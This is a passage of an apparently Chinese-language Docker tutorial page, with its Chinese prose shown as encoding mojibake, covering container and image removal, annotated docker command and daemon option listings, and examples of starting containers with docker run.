class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="keyword">rm</span> container_name/container_id</span><br></pre></td></tr></table></figure><p>ç„¶åè¿™ä¸ªæ—¶å€™æˆ‘ä»¬å†å»åˆ é™¤è¿™ä¸ªé•œåƒï¼š</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">docker</span> rmi image_name</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶ï¼Œå¸¸ç”¨çš„ Docker ç›¸å…³çš„å‘½ä»¤å°±è®²åˆ°è¿™é‡Œä¸ºæ­¢äº†ï¼Œæˆ‘ä»¬åœ¨åç»­çš„æ–‡ç« ä¸­è¿˜ä¼šåå¤åœ°æåˆ°è¿™äº›å‘½ä»¤ã€‚</p><h3 id="Dockerå‘½ä»¤æŸ¥è¯¢"><a href="#Dockerå‘½ä»¤æŸ¥è¯¢" class="headerlink" title="Dockerå‘½ä»¤æŸ¥è¯¢"></a>Dockerå‘½ä»¤æŸ¥è¯¢</h3><p><strong>åŸºæœ¬è¯­æ³•</strong></p><p>Docker å‘½ä»¤æœ‰ä¸¤å¤§ç±»ï¼Œå®¢æˆ·ç«¯å‘½ä»¤å’ŒæœåŠ¡ç«¯å‘½ä»¤ã€‚å‰è€…æ˜¯ä¸»è¦çš„æ“ä½œæ¥å£ï¼Œåè€…ç”¨æ¥å¯åŠ¨ Docker Daemonã€‚</p><ul><li><p>å®¢æˆ·ç«¯å‘½ä»¤ï¼šåŸºæœ¬å‘½ä»¤æ ¼å¼ä¸º docker [OPTIONS] COMMAND [argâ€¦]ï¼›</p></li><li><p>æœåŠ¡ç«¯å‘½ä»¤ï¼šåŸºæœ¬å‘½ä»¤æ ¼å¼ä¸º dockerd [OPTIONS]ã€‚</p></li></ul><p>å¯ä»¥é€šè¿‡ man docker æˆ– docker help æ¥æŸ¥çœ‹è¿™äº›å‘½ä»¤ã€‚</p><p><strong>å®¢æˆ·ç«¯å‘½ä»¤é€‰é¡¹</strong></p><ul><li>â€“config=â€â€ï¼šæŒ‡å®šå®¢æˆ·ç«¯é…ç½®æ–‡ä»¶ï¼Œé»˜è®¤ä¸º ~/.dockerï¼›</li><li>-D=true|falseï¼šæ˜¯å¦ä½¿ç”¨ debug æ¨¡å¼ã€‚é»˜è®¤ä¸å¼€å¯ï¼›</li><li>-H, â€“host=[]ï¼šæŒ‡å®šå‘½ä»¤å¯¹åº” Docker å®ˆæŠ¤è¿›ç¨‹çš„ç›‘å¬æ¥å£ï¼Œå¯ä»¥ä¸º unix å¥—æ¥å­— unix:///path/to/socketï¼Œæ–‡ä»¶å¥æŸ„ fd://socketfd æˆ– tcp å¥—æ¥å­— tcp://[host[:port]]ï¼Œé»˜è®¤ä¸º unix:///var/run/docker.sockï¼›</li><li>-l, â€“log-level=â€debug|info|warn|error|fatalâ€ï¼šæŒ‡å®šæ—¥å¿—è¾“å‡ºçº§åˆ«ï¼›</li><li>â€“tls=true|falseï¼šæ˜¯å¦å¯¹ Docker å®ˆæŠ¤è¿›ç¨‹å¯ç”¨ TLS å®‰å…¨æœºåˆ¶ï¼Œé»˜è®¤ä¸ºå¦ï¼›</li><li>â€“tlscacert=/.docker/ca.pemï¼šTLS CA ç­¾åçš„å¯ä¿¡è¯ä¹¦æ–‡ä»¶è·¯å¾„ï¼›</li><li>â€“tlscert=/.docker/cert.pemï¼šTLS å¯ä¿¡è¯ä¹¦æ–‡ä»¶è·¯å¾„ï¼›</li><li>â€“tlscert=/.docker/key.pemï¼šTLS å¯†é’¥æ–‡ä»¶è·¯å¾„ï¼›</li><li>â€“tlsverify=true|falseï¼šå¯ç”¨ TLS æ ¡éªŒï¼Œé»˜è®¤ä¸ºå¦ã€‚</li></ul><p><strong>Dockerå‘½ä»¤å¸®åŠ©æ³¨é‡Š</strong></p><p>docker command</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">$ sudo docker   <span class="comment"># docker å‘½ä»¤å¸®åŠ©</span></span><br><span class="line"></span><br><span class="line">Commands:</span><br><span class="line">    attach    Attach to a running container                 <span class="comment"># å½“å‰ shell ä¸‹ attach è¿æ¥æŒ‡å®šè¿è¡Œé•œåƒ</span></span><br><span class="line">    build     Build an image from a Dockerfile              <span class="comment"># é€šè¿‡ Dockerfile å®šåˆ¶é•œåƒ</span></span><br><span class="line">    <span class="keyword">commit</span>    <span class="keyword">Create</span> a <span class="keyword">new</span> image <span class="keyword">from</span> a <span class="keyword">container</span><span class="string">'s changes # æäº¤å½“å‰å®¹å™¨ä¸ºæ–°çš„é•œåƒ</span></span><br><span class="line"><span class="string">    cp        Copy files/folders from the containers filesystem to the host path</span></span><br><span class="line"><span class="string">              # ä»å®¹å™¨ä¸­æ‹·è´æŒ‡å®šæ–‡ä»¶æˆ–è€…ç›®å½•åˆ°å®¿ä¸»æœºä¸­</span></span><br><span class="line"><span class="string">    create    Create a new container                        # åˆ›å»ºä¸€ä¸ªæ–°çš„å®¹å™¨ï¼ŒåŒ runï¼Œä½†ä¸å¯åŠ¨å®¹å™¨</span></span><br><span class="line"><span class="string">    diff      Inspect changes on a container'</span>s filesystem   <span class="comment"># æŸ¥çœ‹ docker å®¹å™¨å˜åŒ–</span></span><br><span class="line">    <span class="keyword">events</span>    <span class="keyword">Get</span> <span class="built_in">real</span> <span class="built_in">time</span> <span class="keyword">events</span> <span class="keyword">from</span> the <span class="keyword">server</span>          <span class="comment"># ä» docker æœåŠ¡è·å–å®¹å™¨å®æ—¶äº‹ä»¶</span></span><br><span class="line">    exec      Run a command <span class="keyword">in</span> an existing <span class="keyword">container</span>        <span class="comment"># åœ¨å·²å­˜åœ¨çš„å®¹å™¨ä¸Šè¿è¡Œå‘½ä»¤</span></span><br><span class="line">    <span class="keyword">export</span>    Stream the <span class="keyword">contents</span> <span class="keyword">of</span> a <span class="keyword">container</span> <span class="keyword">as</span> a tar <span class="keyword">archive</span>   </span><br><span class="line">              <span class="comment"># å¯¼å‡ºå®¹å™¨çš„å†…å®¹æµä½œä¸ºä¸€ä¸ª tar å½’æ¡£æ–‡ä»¶[å¯¹åº” import ]</span></span><br><span class="line">    history   <span class="keyword">Show</span> the history <span class="keyword">of</span> an image                  <span class="comment"># å±•ç¤ºä¸€ä¸ªé•œåƒå½¢æˆå†å²</span></span><br><span class="line">    images    <span class="keyword">List</span> images                                   <span class="comment"># åˆ—å‡ºç³»ç»Ÿå½“å‰é•œåƒ</span></span><br><span class="line">    <span class="keyword">import</span>    <span class="keyword">Create</span> a <span class="keyword">new</span> filesystem image <span class="keyword">from</span> the <span class="keyword">contents</span> <span class="keyword">of</span> a tarball  </span><br><span class="line">              <span class="comment"># ä»taråŒ…ä¸­çš„å†…å®¹åˆ›å»ºä¸€ä¸ªæ–°çš„æ–‡ä»¶ç³»ç»Ÿæ˜ åƒ[å¯¹åº” export]</span></span><br><span class="line">    info      Display <span class="keyword">system</span>-wide information               <span class="comment"># æ˜¾ç¤ºç³»ç»Ÿç›¸å…³ä¿¡æ¯</span></span><br><span class="line">    inspect   <span class="keyword">Return</span> <span class="keyword">low</span>-<span class="keyword">level</span> information <span class="keyword">on</span> a <span class="keyword">container</span>   <span class="comment"># æŸ¥çœ‹å®¹å™¨è¯¦ç»†ä¿¡æ¯</span></span><br><span class="line">    <span class="keyword">kill</span>      <span class="keyword">Kill</span> a running <span class="keyword">container</span>                      <span class="comment"># kill æŒ‡å®š docker å®¹å™¨</span></span><br><span class="line">    <span class="keyword">load</span>      <span class="keyword">Load</span> an image <span class="keyword">from</span> a tar <span class="keyword">archive</span>              <span class="comment"># ä»ä¸€ä¸ª tar åŒ…ä¸­åŠ è½½ä¸€ä¸ªé•œåƒ[å¯¹åº” save]</span></span><br><span class="line">    login     <span class="keyword">Register</span> <span class="keyword">or</span> Login <span class="keyword">to</span> the docker registry <span class="keyword">server</span>   </span><br><span class="line">              <span class="comment"># æ³¨å†Œæˆ–è€…ç™»é™†ä¸€ä¸ª docker æºæœåŠ¡å™¨</span></span><br><span class="line">    logout    <span class="keyword">Log</span> <span class="keyword">out</span> <span class="keyword">from</span> a Docker registry <span class="keyword">server</span>         <span class="comment"># ä»å½“å‰ Docker registry é€€å‡º</span></span><br><span class="line">    <span class="keyword">logs</span>      <span class="keyword">Fetch</span> the <span class="keyword">logs</span> <span class="keyword">of</span> a <span class="keyword">container</span>                 <span class="comment"># è¾“å‡ºå½“å‰å®¹å™¨æ—¥å¿—ä¿¡æ¯</span></span><br><span class="line">    port      Lookup the <span class="keyword">public</span>-facing port which <span class="keyword">is</span> NAT-ed <span class="keyword">to</span> PRIVATE_PORT</span><br><span class="line">              <span class="comment"># æŸ¥çœ‹æ˜ å°„ç«¯å£å¯¹åº”çš„å®¹å™¨å†…éƒ¨æºç«¯å£</span></span><br><span class="line">    pause     Pause <span class="keyword">all</span> processes <span class="keyword">within</span> a <span class="keyword">container</span>        <span class="comment"># æš‚åœå®¹å™¨</span></span><br><span class="line">    ps        <span class="keyword">List</span> containers                               <span class="comment"># åˆ—å‡ºå®¹å™¨åˆ—è¡¨</span></span><br><span class="line">    pull      Pull an image <span class="keyword">or</span> a repository <span class="keyword">from</span> the docker registry <span class="keyword">server</span></span><br><span class="line">              <span class="comment"># ä»dockeré•œåƒæºæœåŠ¡å™¨æ‹‰å–æŒ‡å®šé•œåƒæˆ–è€…åº“é•œåƒ</span></span><br><span class="line">    push      Push an image <span class="keyword">or</span> a repository <span class="keyword">to</span> the docker registry <span class="keyword">server</span></span><br><span class="line">              <span class="comment"># æ¨é€æŒ‡å®šé•œåƒæˆ–è€…åº“é•œåƒè‡³dockeræºæœåŠ¡å™¨</span></span><br><span class="line">    restart   Restart a running <span class="keyword">container</span>                   <span class="comment"># é‡å¯è¿è¡Œçš„å®¹å™¨</span></span><br><span class="line">    rm        Remove one <span class="keyword">or</span> more containers                 <span class="comment"># ç§»é™¤ä¸€ä¸ªæˆ–è€…å¤šä¸ªå®¹å™¨</span></span><br><span class="line">    rmi       Remove one <span class="keyword">or</span> more images                 </span><br><span class="line">              <span class="comment"># ç§»é™¤ä¸€ä¸ªæˆ–å¤šä¸ªé•œåƒ[æ— å®¹å™¨ä½¿ç”¨è¯¥é•œåƒæ‰å¯åˆ é™¤ï¼Œå¦åˆ™éœ€åˆ é™¤ç›¸å…³å®¹å™¨æ‰å¯ç»§ç»­æˆ– -f å¼ºåˆ¶åˆ é™¤]</span></span><br><span class="line">    run       Run a command <span class="keyword">in</span> a <span class="keyword">new</span> <span class="keyword">container</span></span><br><span class="line">              <span class="comment"># åˆ›å»ºä¸€ä¸ªæ–°çš„å®¹å™¨å¹¶è¿è¡Œä¸€ä¸ªå‘½ä»¤</span></span><br><span class="line">    <span class="keyword">save</span>      <span class="keyword">Save</span> an image <span class="keyword">to</span> a tar <span class="keyword">archive</span>                <span class="comment"># ä¿å­˜ä¸€ä¸ªé•œåƒä¸ºä¸€ä¸ª tar åŒ…[å¯¹åº” load]</span></span><br><span class="line">    <span class="keyword">search</span>    <span class="keyword">Search</span> <span class="keyword">for</span> an image <span class="keyword">on</span> the Docker Hub         <span class="comment"># åœ¨ docker hub ä¸­æœç´¢é•œåƒ</span></span><br><span class="line">    <span class="keyword">start</span>     <span class="keyword">Start</span> a stopped containers                    <span class="comment"># å¯åŠ¨å®¹å™¨</span></span><br><span class="line">    <span class="keyword">stop</span>      <span class="keyword">Stop</span> a running containers                     <span class="comment"># åœæ­¢å®¹å™¨</span></span><br><span class="line">    tag       Tag an image <span class="keyword">into</span> a repository                <span class="comment"># ç»™æºä¸­é•œåƒæ‰“æ ‡ç­¾</span></span><br><span class="line">    top       Lookup the running processes <span class="keyword">of</span> a <span class="keyword">container</span>   <span class="comment"># æŸ¥çœ‹å®¹å™¨ä¸­è¿è¡Œçš„è¿›ç¨‹ä¿¡æ¯</span></span><br><span class="line">    unpause   Unpause a paused <span class="keyword">container</span>                    <span class="comment"># å–æ¶ˆæš‚åœå®¹å™¨</span></span><br><span class="line">    <span class="keyword">version</span>   <span class="keyword">Show</span> the docker <span class="keyword">version</span> information           <span class="comment"># æŸ¥çœ‹ docker ç‰ˆæœ¬å·</span></span><br><span class="line">    <span class="keyword">wait</span>      <span class="keyword">Block</span> <span class="keyword">until</span> a <span class="keyword">container</span> stops, <span class="keyword">then</span> print its <span class="keyword">exit</span> code   </span><br><span class="line">              <span class="comment"># æˆªå–å®¹å™¨åœæ­¢æ—¶çš„é€€å‡ºçŠ¶æ€å€¼</span></span><br><span class="line">Run <span class="string">'docker COMMAND --help'</span> <span class="keyword">for</span> more information <span class="keyword">on</span> a command.</span><br></pre></td></tr></table></figure><p>docker option</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">Usage of docker:</span><br><span class="line">  --api-<span class="keyword">enable</span>-cors=false                <span class="keyword">Enable</span> CORS headers in the remote API                      <span class="meta"># è¿œç¨‹ API ä¸­å¼€å¯ CORS å¤´</span></span><br><span class="line">  -b, --bridge=<span class="string">""</span>                        Attach containers to a pre-existing network bridge         <span class="meta"># æ¡¥æ¥ç½‘ç»œ</span></span><br><span class="line">                                           <span class="keyword">use</span> 'none' to <span class="keyword">disable</span> container networking</span><br><span class="line">  --bip=<span class="string">""</span>                               <span class="keyword">Use</span> this CIDR notation address <span class="keyword">for</span> the network bridge's IP, not compatible with -b</span><br><span class="line">                                         # å’Œ -b é€‰é¡¹ä¸å…¼å®¹ï¼Œå…·ä½“æ²¡æœ‰æµ‹è¯•è¿‡</span><br><span class="line">  -d, --daemon=false                     Enable daemon mode                                         # daemon æ¨¡å¼</span><br><span class="line">  -D, --debug=false                      Enable debug mode                                          # debug æ¨¡å¼</span><br><span class="line">  --dns=[]                               Force docker to use specific DNS servers                   # å¼ºåˆ¶ docker ä½¿ç”¨æŒ‡å®š dns æœåŠ¡å™¨</span><br><span class="line">  --dns-search=[]                        Force Docker to use specific DNS search domains            # å¼ºåˆ¶ docker ä½¿ç”¨æŒ‡å®š dns æœç´¢åŸŸ</span><br><span class="line">  -e, --exec-driver="native"             Force the docker runtime to use a specific exec driver     # å¼ºåˆ¶ docker è¿è¡Œæ—¶ä½¿ç”¨æŒ‡å®šæ‰§è¡Œé©±åŠ¨å™¨</span><br><span class="line">  --fixed-cidr=""                        IPv4 subnet <span class="keyword">for</span> fixed IPs (ex: <span class="number">10.20</span><span class="number">.0</span><span class="number">.0</span>/<span class="number">16</span>)</span><br><span class="line">                                           this subnet must be nested in the bridge subnet (which is defined by -b or --bip)</span><br><span class="line">  -G, --group="docker"                   Group to assign the unix socket specified by -H when running in daemon mode</span><br><span class="line">                                           use '' (the empty string) to disable setting of a group</span><br><span class="line">  -g, --graph="/var/lib/docker"          Path to use as the root of the docker runtime              # å®¹å™¨è¿è¡Œçš„æ ¹ç›®å½•è·¯å¾„</span><br><span class="line">  -H, --host=[]                          The socket(s) to bind to in daemon mode                    # daemon æ¨¡å¼ä¸‹ docker æŒ‡å®šç»‘å®šæ–¹å¼[tcp or æœ¬åœ° socket]</span><br><span class="line">                                           specified using one or more tcp://host:port, unix:///path/to/socket, fd:/<span class="comment">/* or fd://socketfd.</span></span><br><span class="line"><span class="comment">  --icc=true                             Enable inter-container communication                       # è·¨å®¹å™¨é€šä¿¡</span></span><br><span class="line"><span class="comment">  --insecure-registry=[]                 Enable insecure communication with specified registries (no certificate verification for HTTPS and enable HTTP fallback) (e.g., localhost:5000 or 10.20.0.0/16)</span></span><br><span class="line"><span class="comment">  --ip="0.0.0.0"                         Default IP address to use when binding container ports     # æŒ‡å®šç›‘å¬åœ°å€ï¼Œé»˜è®¤æ‰€æœ‰ ip</span></span><br><span class="line"><span class="comment">  --ip-forward=true                      Enable net.ipv4.ip_forward                                 # å¼€å¯è½¬å‘</span></span><br><span class="line"><span class="comment">  --ip-masq=true                         Enable IP masquerading for bridge's IP range</span></span><br><span class="line"><span class="comment">  --iptables=true                        Enable Docker's addition of iptables rules                 # æ·»åŠ å¯¹åº” iptables è§„åˆ™</span></span><br><span class="line"><span class="comment">  --mtu=0                                Set the containers network MTU                             # è®¾ç½®ç½‘ç»œ mtu</span></span><br><span class="line"><span class="comment">                                           if no value is provided: default to the default route MTU or 1500 if no default route is available</span></span><br><span class="line"><span class="comment">  -p, --pidfile="/var/run/docker.pid"    Path to use for daemon PID file                            # æŒ‡å®š pid æ–‡ä»¶ä½ç½®</span></span><br><span class="line"><span class="comment">  --registry-mirror=[]                   Specify a preferred Docker registry mirror                  </span></span><br><span class="line"><span class="comment">  -s, --storage-driver=""                Force the docker runtime to use a specific storage driver  # å¼ºåˆ¶ docker è¿è¡Œæ—¶ä½¿ç”¨æŒ‡å®šå­˜å‚¨é©±åŠ¨</span></span><br><span class="line"><span class="comment">  --selinux-enabled=false                Enable selinux support                                     # å¼€å¯ selinux æ”¯æŒ</span></span><br><span class="line"><span class="comment">  --storage-opt=[]                       Set storage driver options                                 # è®¾ç½®å­˜å‚¨é©±åŠ¨é€‰é¡¹</span></span><br><span class="line"><span class="comment">  --tls=false                            Use TLS; implied by tls-verify flags                       # å¼€å¯ tls</span></span><br><span class="line"><span class="comment">  --tlscacert="/root/.docker/ca.pem"     Trust only remotes providing a certificate signed by the CA given here</span></span><br><span class="line"><span class="comment">  --tlscert="/root/.docker/cert.pem"     Path to TLS certificate file                               # tls è¯ä¹¦æ–‡ä»¶ä½ç½®</span></span><br><span class="line"><span class="comment">  --tlskey="/root/.docker/key.pem"       Path to TLS key file                                       # tls key æ–‡ä»¶ä½ç½®</span></span><br><span class="line"><span class="comment">  --tlsverify=false                      Use TLS and verify the remote (daemon: verify client, client: verify daemon) # ä½¿ç”¨ tls å¹¶ç¡®è®¤è¿œç¨‹æ§åˆ¶ä¸»æœº</span></span><br><span class="line"><span class="comment">  -v, --version=false                    Print version information and quit                         # è¾“å‡º docker ç‰ˆæœ¬ä¿¡æ¯</span></span><br></pre></td></tr></table></figure><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1566366788030.png" alt></p><p>Docker æä¾›äº†ä¸€å¥—ç®€å•å®ç”¨çš„å‘½ä»¤æ¥åˆ›å»ºå’Œæ›´æ–°é•œåƒï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ç½‘ç»œç›´æ¥ä¸‹è½½ä¸€ä¸ªå·²ç»åˆ›å»ºå¥½äº†çš„åº”ç”¨é•œåƒï¼Œå¹¶é€šè¿‡ Docker RUN å‘½ä»¤å°±å¯ä»¥ç›´æ¥ä½¿ç”¨ã€‚å½“é•œåƒé€šè¿‡ RUN å‘½ä»¤è¿è¡ŒæˆåŠŸåï¼Œè¿™ä¸ªè¿è¡Œçš„é•œåƒå°±æ˜¯ä¸€ä¸ª Docker å®¹å™¨å•¦ï¼Œå®¹å™¨å¯ä»¥ç†è§£ä¸ºä¸€ä¸ªè½»é‡çº§çš„æ²™ç®±ï¼Œ Docker åˆ©ç”¨å®¹å™¨æ¥è¿è¡Œå’Œéš”ç¦»åº”ç”¨ï¼Œå®¹å™¨æ˜¯å¯ä»¥è¢«å¯åŠ¨ã€åœæ­¢ã€åˆ é™¤çš„ï¼Œè¿™å¹¶ä¸ä¼šå½±å“ Docker é•œåƒã€‚</p><p>æˆ‘ä»¬å¯ä»¥çœ‹çœ‹ä¸‹é¢è¿™å¹…å›¾ï¼š</p><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1566367311929.png" alt></p><h3 id="æ“ä½œå®¹å™¨"><a href="#æ“ä½œå®¹å™¨" class="headerlink" title="æ“ä½œå®¹å™¨"></a>æ“ä½œå®¹å™¨</h3><p><strong>å¯åŠ¨å®¹å™¨</strong></p><p>å¯åŠ¨å®¹å™¨æœ‰ä¸¤ç§æ–¹å¼ï¼Œä¸€ç§æ˜¯åŸºäºé•œåƒæ–°å»ºä¸€ä¸ªå®¹å™¨å¹¶å¯åŠ¨ï¼Œå¦å¤–ä¸€ä¸ªæ˜¯å°†åœ¨ç»ˆæ­¢çŠ¶æ€ï¼ˆstoppedï¼‰çš„å®¹å™¨é‡æ–°å¯åŠ¨ã€‚</p><p>å› ä¸º Docker çš„å®¹å™¨å®åœ¨å¤ªè½»é‡çº§äº†ï¼Œå¾ˆå¤šæ—¶å€™ç”¨æˆ·éƒ½æ˜¯éšæ—¶åˆ é™¤å’Œæ–°åˆ›å»ºå®¹å™¨ã€‚</p><p><strong>æ–°å»ºå¹¶å¯åŠ¨</strong></p><p>æ‰€éœ€è¦çš„å‘½ä»¤ä¸»è¦ä¸º <code>docker run</code>ã€‚</p><blockquote><p>docker build -t æ˜¯åˆ©ç”¨Dockerfile æ„å»ºé•œåƒï¼Œè¿™ä¸ªæ—¶å€™å¯ä»¥ä½¿ç”¨ â€“name æ¥ç»™è‡ªå·±çš„é•œåƒå‘½å;<br>docker run æ˜¯åˆ©ç”¨ä¾æ®è¿™ä¸ªé•œåƒæ„å»ºå®¹å™¨ï¼Œè¿™ä¸ªæ—¶å€™å¯ä»¥ä½¿ç”¨ â€“name å‘½åä½ çš„å®¹å™¨;<br>å¦‚æœå®¹å™¨éœ€è¦ä¿®æ”¹é…ç½®æ–‡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥é€‰æ‹©æŒ‚è½½/æŒ‚è½½æ•°æ®å·çš„æ–¹å¼ï¼Œä¹Ÿå¯ä»¥ç›´æ¥COPY/ADDæ¥è¦†ç›–</p></blockquote><p>ä¾‹å¦‚ï¼Œä¸‹é¢çš„å‘½ä»¤è¾“å‡ºä¸€ä¸ª â€œHello Worldâ€ï¼Œä¹‹åç»ˆæ­¢å®¹å™¨ã€‚</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ docker <span class="keyword">run</span><span class="bash"> --name wubantu ubuntu:18.04 /bin/<span class="built_in">echo</span> <span class="string">'Hello world'</span></span></span><br><span class="line">Hello world</span><br></pre></td></tr></table></figure><p>è¿™è·Ÿåœ¨æœ¬åœ°ç›´æ¥æ‰§è¡Œ <code>/bin/echo &#39;hello world&#39;</code> å‡ ä¹æ„Ÿè§‰ä¸å‡ºä»»ä½•åŒºåˆ«ã€‚</p><p>ä¸‹é¢çš„å‘½ä»¤åˆ™å¯åŠ¨ä¸€ä¸ª bash ç»ˆç«¯ï¼Œå…è®¸ç”¨æˆ·è¿›è¡Œäº¤äº’ã€‚</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ </span>docker run -t -i <span class="symbol">ubuntu:</span><span class="number">18.04</span> /bin/bash</span><br><span class="line">root<span class="variable">@af8bae53bdd3</span><span class="symbol">:/</span><span class="comment">#</span></span><br></pre></td></tr></table></figure><p>å…¶ä¸­ï¼Œ-t é€‰é¡¹è®©Dockeråˆ†é…ä¸€ä¸ªä¼ªç»ˆç«¯ï¼ˆpseudo-ttyï¼‰å¹¶ç»‘å®šåˆ°å®¹å™¨çš„æ ‡å‡†è¾“å…¥ä¸Šï¼Œ -i åˆ™è®©å®¹å™¨çš„æ ‡å‡†è¾“å…¥ä¿æŒæ‰“å¼€ã€‚</p><p>åœ¨äº¤äº’æ¨¡å¼ä¸‹ï¼Œç”¨æˆ·å¯ä»¥é€šè¿‡æ‰€åˆ›å»ºçš„ç»ˆç«¯æ¥è¾“å…¥å‘½ä»¤ï¼Œä¾‹å¦‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@af8bae53bdd3:/# pwd</span><br><span class="line">/</span><br><span class="line">root@af8bae53bdd3:/# ls</span><br><span class="line">bin boot dev etc home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var</span><br></pre></td></tr></table></figure><p>å½“åˆ©ç”¨ docker run æ¥åˆ›å»ºå®¹å™¨æ—¶ï¼ŒDocker åœ¨åå°è¿è¡Œçš„æ ‡å‡†æ“ä½œåŒ…æ‹¬ï¼š</p><ul><li>æ£€æŸ¥æœ¬åœ°æ˜¯å¦å­˜åœ¨æŒ‡å®šçš„é•œåƒï¼Œä¸å­˜åœ¨å°±ä»å…¬æœ‰ä»“åº“ä¸‹è½½</li><li>åˆ©ç”¨é•œåƒåˆ›å»ºå¹¶å¯åŠ¨ä¸€ä¸ªå®¹å™¨</li><li>åˆ†é…ä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿï¼Œå¹¶åœ¨åªè¯»çš„é•œåƒå±‚å¤–é¢æŒ‚è½½ä¸€å±‚å¯è¯»å†™å±‚</li><li>ä»å®¿ä¸»ä¸»æœºé…ç½®çš„ç½‘æ¡¥æ¥å£ä¸­æ¡¥æ¥ä¸€ä¸ªè™šæ‹Ÿæ¥å£åˆ°å®¹å™¨ä¸­å»</li><li>ä»åœ°å€æ± é…ç½®ä¸€ä¸ª ip åœ°å€ç»™å®¹å™¨</li><li>æ‰§è¡Œç”¨æˆ·æŒ‡å®šçš„åº”ç”¨ç¨‹åº</li><li>æ‰§è¡Œå®Œæ¯•åå®¹å™¨è¢«ç»ˆæ­¢</li></ul><p><strong>å¯åŠ¨å·²ç»ˆæ­¢å®¹å™¨</strong></p><p>å¯ä»¥åˆ©ç”¨ <code>docker container start</code> å‘½ä»¤ï¼Œç›´æ¥å°†ä¸€ä¸ªå·²ç»ç»ˆæ­¢çš„å®¹å™¨å¯åŠ¨è¿è¡Œã€‚</p><p>å®¹å™¨çš„æ ¸å¿ƒä¸ºæ‰€æ‰§è¡Œçš„åº”ç”¨ç¨‹åºï¼Œæ‰€éœ€è¦çš„èµ„æºéƒ½æ˜¯åº”ç”¨ç¨‹åºè¿è¡Œæ‰€å¿…éœ€çš„ã€‚é™¤æ­¤ä¹‹å¤–ï¼Œå¹¶æ²¡æœ‰å…¶å®ƒçš„èµ„æºã€‚å¯ä»¥åœ¨ä¼ªç»ˆç«¯ä¸­åˆ©ç”¨ ps æˆ– top æ¥æŸ¥çœ‹è¿›ç¨‹ä¿¡æ¯ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@ba267838cc1b:/# ps</span><br><span class="line">  PID TTY          TIME CMD</span><br><span class="line">    1 ?        00:00:00 bash</span><br><span class="line">   11 ?        00:00:00 ps</span><br></pre></td></tr></table></figure><p><strong>åå°è¿è¡Œ</strong></p><p>æ›´å¤šçš„æ—¶å€™ï¼Œéœ€è¦è®© Docker åœ¨åå°è¿è¡Œè€Œä¸æ˜¯ç›´æ¥æŠŠæ‰§è¡Œå‘½ä»¤çš„ç»“æœè¾“å‡ºåœ¨å½“å‰å®¿ä¸»æœºä¸‹ã€‚æ­¤æ—¶ï¼Œå¯ä»¥é€šè¿‡æ·»åŠ  <code>-d</code> å‚æ•°æ¥å®ç°ã€‚</p><p>ä¸‹é¢ä¸¾ä¸¤ä¸ªä¾‹å­æ¥è¯´æ˜ä¸€ä¸‹ã€‚</p><p>å¦‚æœä¸ä½¿ç”¨ <code>-d</code> å‚æ•°è¿è¡Œå®¹å™¨ã€‚</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ docker <span class="keyword">run</span><span class="bash"> ubuntu:18.04 /bin/sh -c <span class="string">"while true; do echo hello world; sleep 1; done"</span></span></span><br><span class="line">hello world</span><br><span class="line">hello world</span><br><span class="line">hello world</span><br><span class="line">hello 